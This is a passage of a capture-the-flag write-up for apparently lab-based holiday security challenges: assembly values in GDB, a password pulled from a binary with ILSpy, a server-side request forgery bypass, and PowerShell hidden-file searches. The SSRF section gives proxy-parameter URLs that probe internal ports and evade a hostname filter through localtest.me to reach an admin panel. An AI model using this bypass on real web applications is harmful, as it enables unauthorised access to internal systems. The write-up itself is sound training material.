local_ch when its corresponding movl instruction is called (first if multiple)?" title="Direct link to What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?">​</a></h4><p>The value of <code>local_ch</code> was <code>0x00000001</code> which is hexadecimal for <code>1</code>.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-value-of-eax-when-the-imull-instruction-is-called">What is the value of eax when the imull instruction is called?<a href="#what-is-the-value-of-eax-when-the-imull-instruction-is-called" class="hash-link" aria-label="Direct link to What is the value of eax when the imull instruction is called?" title="Direct link to What is the value of eax when the imull instruction is called?">​</a></h4><p>The value of <code>eax</code> was <code>0x6</code> which is hexadecimal for <code>6</code>.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-value-of-local_4h-before-eax-is-set-to-0">What is the value of local_4h before eax is set to 0?<a href="#what-is-the-value-of-local_4h-before-eax-is-set-to-0" class="hash-link" aria-label="Direct link to What is the value of local_4h before eax is set to 0?" title="Direct link to What is the value of local_4h before eax is set to 0?">​</a></h4><p>The value of <code>local_4h</code> was <code>0x00000006</code> which is hexadecimal for <code>6</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="side-note">Side note<a href="#side-note" class="hash-link" aria-label="Direct link to Side note" title="Direct link to Side note">​</a></h3><p>Since this was a relatively simple binary we could have gotten the answers just by reading the assembly code.</p><p>Here, we see the value <code>0x1</code> being put into <code>rbp-0xc</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000400b51 &lt;+4&gt;:     mov    DWORD PTR [rbp-0xc],0x1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next we see the value <code>0x6</code> being put into <code>rbp-0x8</code> which is later put into <code>eax</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000400b58 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x8],0x6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000400b62 &lt;+21&gt;:    imul   eax,DWORD PTR [rbp-0x8]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lastly, we see the value of <code>eax</code> (which is <code>0x6</code>) being put into <code>rbp-0x4</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000400b66 &lt;+25&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-18-the-bits-of-the-christmas">Day 18: The Bits of the Christmas<a href="#day-18-the-bits-of-the-christmas" class="hash-link" aria-label="Direct link to Day 18: The Bits of the Christmas" title="Direct link to Day 18: The Bits of the Christmas">​</a></h2><p><em>Category: Reverse Engineering</em><br>
<em>Tags: GDB, Linux</em></p><blockquote><p>Continuing from yesterday, practice your reverse engineering.</p></blockquote><p>IP: <code>10.10.120.124</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-the-windows-machine-using-rdp">Connecting to the Windows Machine using RDP<a href="#connecting-to-the-windows-machine-using-rdp" class="hash-link" aria-label="Direct link to Connecting to the Windows Machine using RDP" title="Direct link to Connecting to the Windows Machine using RDP">​</a></h3><p>I used Microsoft Remote Desktop for macOS to connect to the target machine. I logged in with the credentials <code>cmnatic:Adventofcyber!</code>.</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># By the way, here is the command to forward a port the target machine through a virtual machine to the host machine.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh -L 3389:IP_OF_TARGET_MACHINE:3389 IP_OF_VIRTUAL_MACHINE</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="screenshot" src="/assets/images/rdp-139a51c2dab1b04d4844711966c62efb.png" width="1919" height="1012" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-santas-password-and-the-flag">Getting Santa&#x27;s password and the flag!<a href="#getting-santas-password-and-the-flag" class="hash-link" aria-label="Direct link to Getting Santa&#x27;s password and the flag!" title="Direct link to Getting Santa&#x27;s password and the flag!">​</a></h3><p>Next, we can open up the binary in ILSpy. After poking around, I found the following:</p><p><img loading="lazy" alt="screenshot" src="/assets/images/ilspy-b2a6a3150743292c3cf6676f075380e3.png" width="1420" height="788" class="img_ev3q"></p><p>We can see the santa&#x27;s password is <code>santapassword321</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="although-technically-the-flags-in-the-previous-screenshot">Although technically the flag&#x27;s in the previous screenshot...<a href="#although-technically-the-flags-in-the-previous-screenshot" class="hash-link" aria-label="Direct link to Although technically the flag&#x27;s in the previous screenshot..." title="Direct link to Although technically the flag&#x27;s in the previous screenshot...">​</a></h3><p>I still wanted to run the executable application. So I opened it up and enter the password we found.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/success-e473422f7f733db249227eaf2635bfbb.png" width="446" height="534" class="img_ev3q"></p><p>Flag: <code>thm{046af}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-19-the-naughty-or-nice-list">Day 19: The Naughty or Nice List<a href="#day-19-the-naughty-or-nice-list" class="hash-link" aria-label="Direct link to Day 19: The Naughty or Nice List" title="Direct link to Day 19: The Naughty or Nice List">​</a></h2><p><em>Category: Special</em><br>
<em>Tags: Web, SSRF</em><br>
<em>Special Contributer: Tib3rius</em>  </p><blockquote><p>Santa has released a web app that lets the children of the world check whether they are currently on the naughty or nice list. Unfortunately the elf who coded it exposed more things than she thought. Can you access the list administration and ensure that every child gets a present from Santa this year?</p></blockquote><p>IP: <code>10.10.219.138</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-vulnerability">Finding the vulnerability<a href="#finding-the-vulnerability" class="hash-link" aria-label="Direct link to Finding the vulnerability" title="Direct link to Finding the vulnerability">​</a></h3><p><img loading="lazy" alt="screenshot" src="/assets/images/index-f427a1541c297b81c79a68b0326fcb08.png" width="1848" height="950" class="img_ev3q"></p><p>Turns out, this page is vulnerable to Server Side Request Forgery.</p><p>After searching for a name, we are redirected to a link similar to <code>http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dbluemoon</code>.</p><p>If we URL Decode the proxy parameter we get <code>http://list.hohoho:8080/search.php?name=bluemoon</code></p><p>So this kinda looks like a URL. However list.hohoho is not a valid URL. This must be the hostname of some backend machine. Let&#x27;s try poking around. If try to visit <code>http://list.hohoho:80</code> by accessing <code>http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A80</code>, we get <code>Failed to connect to list.hohoho port 80: Connection refused</code>. Looks like port 80 is closed. If we try to visit the SSH port using the same technique by visiting <code>http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A22</code> we get <code>Recv failure: Connection reset by peer</code> which means that the SSH port is open but failed to connect since we are sending an HTTP request to the SSH port which surprisingly and unfortunately does not work.</p><p>So next, let&#x27;s check out what&#x27;s running on the machine&#x27;s localhost by visiting <code>http://10.10.219.138/?proxy=http%3A%2F%2Flocalhost</code>. Unfortunately, it their &quot;security team&quot; blocked our attempt with the message <code>Your search has been blocked by our security team.</code>.</p><p>But can we circumvent this? It turns out we can! The &quot;security team&quot; only ensures that the hostname starts with <code>list.hohoho</code>. However, we can find a domain that resolves itself and every subdomain to <code>127.0.0.1</code> (localhost). It turns out <code>localtest.me</code> resolves every subdomain to <code>127.0.0.1</code>. So, we can access the site on <code>localhost:80</code> by visiting <code>http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho.localtest.me</code>.</p><p>Oh and by the way, here is the DNS lookup for <code>localtest.me</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day19-the-naughty-or-nice-list$ nslookup localtest.me</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Server:         127.0.0.53</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Address:        127.0.0.53#53</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Non-authoritative answer:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name:   localtest.me</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Address: 127.0.0.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We also found a message from Elf McSkidy!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Santa,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">If you need to make any changes to the Naughty or Nice list, you need to login.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I know you have trouble remembering your password so here it is: Be good for goodness sake!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">- Elf McSkidy </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So it turns out Santa&#x27;s password is: <code>Be good for goodness sake!</code><br>
<!-- -->We can also guess that his username is either <code>admin</code>, <code>santa</code> or something like that. It turns out it was <code>Santa</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-6">Getting the flag<a href="#getting-the-flag-6" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Now, we can log in with Santa&#x27;s credentials and we are greeted with an admin panel.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/list-735cdd75e99457e8897fa06bc3bc5978.png" width="878" height="154" class="img_ev3q"></p><p>If we click the <code>DELETE NAUGHTY LIST</code> button, we get the flag in a JavaScript alert!</p><p>Flag: <code>THM{EVERYONE_GETS_PRESENTS}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-20-powershellf-to-the-rescue">Day 20: PowershELlF to the rescue<a href="#day-20-powershellf-to-the-rescue" class="hash-link" aria-label="Direct link to Day 20: PowershELlF to the rescue" title="Direct link to Day 20: PowershELlF to the rescue">​</a></h2><p><em>Category: Blue Teaming</em><br>
<em>Tags: Powershell</em></p><blockquote><p>Understand how to use PowerShell to find all that was removed from the stockings that were hidden throughout the endpoint.</p></blockquote><p>IP: <code>10.10.90.95</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-via-ssh-1">Connecting via SSH<a href="#connecting-via-ssh-1" class="hash-link" aria-label="Direct link to Connecting via SSH" title="Direct link to Connecting via SSH">​</a></h3><p>We are given the credentials <code>mceager:r0ckStar!</code></p><p>We run SSH with the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh mceager@10.10.90.95</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We are then greeted with a Windows Command prompt which we can make a Powershell prompt!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 10.0.17763.737]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(c) 2018 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mceager@ELFSTATION1 C:\Users\mceager&gt;powershell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Windows PowerShell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (C) Microsoft Corporation. All rights reserved. </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager&gt; </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-started-in-powershell">Getting started in PowerShell<a href="#getting-started-in-powershell" class="hash-link" aria-label="Direct link to Getting started in PowerShell" title="Direct link to Getting started in PowerShell">​</a></h3><p>Being a macOS and Linux user all my life (well, I have and still use Windows just not for coding), I am very unfamiliar with the Command Prompt and Powershell.</p><p>First we change to the Documents folder.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager&gt; Set-Location Documents </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Documents&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can then do a quick directory listing.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Documents&gt; Get-ChildItem -File -Hidden</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Directory: C:\Users\mceager\Documents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a-hs-        12/7/2020  10:29 AM            402 desktop.ini</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-arh--       11/18/2020   5:05 PM             35 e1fone.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Note, I will be using some Linux aliases throughout since PS cmdlets are too verbose and I&#x27;m lazy and not used to them.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-for-the-first-hidden-elf-file-within-the-documents-folder-read-the-contents-of-this-file-what-does-elf-1-want">Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?<a href="#search-for-the-first-hidden-elf-file-within-the-documents-folder-read-the-contents-of-this-file-what-does-elf-1-want" class="hash-link" aria-label="Direct link to Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?" title="Direct link to Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?">​</a></h3><p>We can get the contents from the <code>e1fone.txt</code> file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Documents&gt; cat e1fone.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">All I want is my &#x27;2 front teeth&#x27;!!!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-on-the-desktop-for-a-hidden-folder-that-contains-the-file-for-elf-2-read-the-contents-of-this-file-what-is-the-name-of-that-movie-that-elf-2-wants">Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?<a href="#search-on-the-desktop-for-a-hidden-folder-that-contains-the-file-for-elf-2-read-the-contents-of-this-file-what-is-the-name-of-that-movie-that-elf-2-wants" class="hash-link" aria-label="Direct link to Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?" title="Direct link to Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?">​</a></h3><p>First, we change to the Desktop folder.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Documents&gt; cd ../Desktop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see an <code>elf2wo</code> directory so let&#x27;s explore.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Desktop&gt; ls -Hidden</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">d--h--        12/7/2020  11:26 AM                elf2wo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a-hs-        12/7/2020  10:29 AM            282 desktop.ini</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Desktop&gt; cd elf2wo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Desktop\elf2wo&gt; ls </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Directory: C:\Users\mceager\Desktop\elf2wo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----       11/17/2020  10:26 AM             64 e70smsW10Y4k.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\mceager\Desktop\elf2wo&gt; cat e70smsW10Y4k.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I want the movie Scrooged &lt;3!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-the-windows-directory-for-a-hidden-folder-that-contains-files-for-elf-3-what-is-the-name-of-the-hidden-folder">Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?<a href="#search-the-windows-directory-for-a-hidden-folder-that-contains-files-for-elf-3-what-is-the-name-of-the-hidden-folder" class="hash-link" aria-label="Direct link to Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?" title="Direct link to Search the Windows directory for 